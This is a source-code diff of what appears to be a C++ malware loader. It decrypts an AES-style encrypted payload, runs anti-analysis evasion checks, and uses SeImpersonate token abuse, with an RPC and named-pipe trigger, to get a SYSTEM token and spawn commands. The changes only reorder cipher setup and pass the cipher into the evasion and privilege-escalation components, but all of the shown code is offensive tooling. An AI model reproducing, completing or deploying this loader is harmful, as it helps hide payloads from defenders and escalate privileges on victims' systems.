@@ -211,20 +211,22 @@ int main(int argc, char* argv[]) {
 
     if (cfg.verbose) std::cout << "\n=== AES LOADER ===\n";
 
-    // 1. Run anti-analysis checks if requested
-    if (cfg.verbose || cfg.anti_analysis) {
-        BypassAnalysis bypass(true);
-        if (!bypass.run_checks()) {
-            return -1;
-        }
-    }
-
-    // 2. Initialize cipher & decrypt
+    // 1. Initialize cipher first (needed for all operations)
     easCipher42 cipher;
     if (!cipher.Init(payload_enc, payload_enc_len)) {
         std::cout << "[-] Cipher Init FAILED\n";
         return -1;
     }
+
+    // 2. Run anti-analysis checks if requested
+    if (cfg.verbose || cfg.anti_analysis) {
+        BypassAnalysis bypass(cipher, true);
+        if (!bypass.run_checks()) {
+            return -1;
+        }
+    }
+
+    // 3. Cipher already initialized, display info
 
     if (cfg.verbose) {
         std::cout << "[+] seed: " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
@@ -265,7 +267,7 @@ int main(int argc, char* argv[]) {
     if (cfg.use_impersonate && !cfg.custom_command.empty() && cfg.mode == InjectionMode::DEFAULT) {
         std::cout << "[*] SeImpersonate with custom command spawn...\n";
 
-        SeImpersonateHandler impersonator(cfg.verbose);
+        SeImpersonateHandler impersonator(cipher, cfg.verbose);
         HANDLE system_token = INVALID_HANDLE_VALUE;
 
         if (!impersonator.Execute(system_token)) {
@@ -330,7 +332,7 @@ int main(int argc, char* argv[]) {
         }
 
         // Step 2: Initialize SeImpersonate handler (will auto-trigger RPC internally)
-        SeImpersonateHandler impersonator(cfg.verbose);
+        SeImpersonateHandler impersonator(cipher, cfg.verbose);
         HANDLE system_token = INVALID_HANDLE_VALUE;
 
         if (!impersonator.Execute(system_token, pipe_uuid)) {
